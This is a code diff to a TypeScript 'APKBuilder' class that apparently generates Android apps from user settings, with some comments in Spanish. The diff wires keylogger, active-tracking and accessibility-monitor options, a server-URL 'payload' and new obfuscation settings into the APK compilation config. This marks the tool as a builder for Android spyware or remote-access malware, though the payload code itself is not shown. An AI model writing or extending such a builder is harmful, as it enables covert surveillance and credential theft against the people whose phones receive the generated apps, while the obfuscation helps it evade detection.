@@ -19,6 +19,9 @@ export interface APKConfig {
   enableKeylogger?: boolean;
   enableActiveTracking?: boolean;
   enableAccessibilityMonitor?: boolean;
+  obfuscate?: boolean;
+  advancedObfuscation?: boolean;
+  targetArchitectures?: string[];
 }
 
 export interface BuildResult {
@@ -59,9 +62,7 @@ export class APKBuilder {
 
       // 1. Crear registro inicial en la DB
       if (db) {
-        // Usamos values().returning() o similar según soporte. 
-        // Si returning() falla, insertamos y luego buscamos o usamos la respuesta del insert.
-        const result = await db.insert(apkBuilds).values({
+        await db.insert(apkBuilds).values({
           buildId: buildIdStr,
           createdBy: userId,
           appName: config.appName,
@@ -75,14 +76,11 @@ export class APKBuilder {
           status: "building",
           createdAt: new Date(),
         });
-        
-        // En MySQL/TiDB, el resultado suele ser un objeto con insertId
-        buildRecordId = (result as any)[0]?.insertId || Date.now();
       }
 
       // 2. Preparar Config para el compilador local
       const compilationConfig: CompilationConfig = {
-        buildId: buildRecordId,
+        buildId: buildIdStr, // Using string instead of number
         appName: config.appName,
         packageName: config.packageName,
         versionCode: config.versionCode,
@@ -92,8 +90,12 @@ export class APKBuilder {
         ports: config.ports,
         payloadCode: config.serverUrl,
         iconUrl: config.iconUrl,
-        obfuscate: false,
-        targetArchitectures: ["arm64-v8a", "armeabi-v7a"],
+        obfuscate: config.obfuscate || false,
+        targetArchitectures: config.targetArchitectures || ["arm64-v8a", "armeabi-v7a"],
+        enableKeylogger: config.enableKeylogger,
+        enableActiveTracking: config.enableActiveTracking,
+        enableAccessibilityMonitor: config.enableAccessibilityMonitor,
+        customPayload: config.advancedObfuscation ? "advanced" : undefined,
       };
 
 
@@ -140,8 +142,8 @@ export class APKBuilder {
 
     } catch (error) {
       console.error(`[APKBuilder] Local Build failed:`, error);
-      if (db && buildRecordId) {
-        await db.update(apkBuilds).set({ status: "failed" }).where(eq(apkBuilds.id, buildRecordId));
+      if (db) {
+        await db.update(apkBuilds).set({ status: "failed" }).where(eq(apkBuilds.buildId, buildIdStr));
       }
       return {
         success: false,
